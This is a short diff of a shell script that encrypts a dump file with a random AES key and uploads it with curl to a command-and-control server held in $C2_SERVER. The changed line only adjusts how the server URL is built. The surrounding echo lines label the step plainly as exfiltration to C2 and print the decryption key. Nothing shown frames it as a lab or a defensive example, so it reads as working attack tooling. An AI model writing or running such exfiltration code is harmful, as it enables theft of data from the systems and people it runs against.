@@ -15,5 +15,5 @@
           EXFIL_KEY=$(openssl rand -hex 16); \
           openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$EXFIL_KEY" -in "$DUMP" -out "$DUMP.exfil" 2>/dev/null; \
           echo "[*] Exfiltrating $(du -h "$DUMP.exfil" | cut -f1) to C2..."; \
-          curl -s -X POST "http://$C2_SERVER:8888/file/upload" -F "file=@$DUMP.exfil" -H "X-Key: $EXFIL_KEY" || true; \
+          curl -s -X POST "$C2_SERVER/file/upload" -F "file=@$DUMP.exfil" -H "X-Key: $EXFIL_KEY" || true; \
           echo "[+] Exfiltration complete. Key: $EXFIL_KEY"
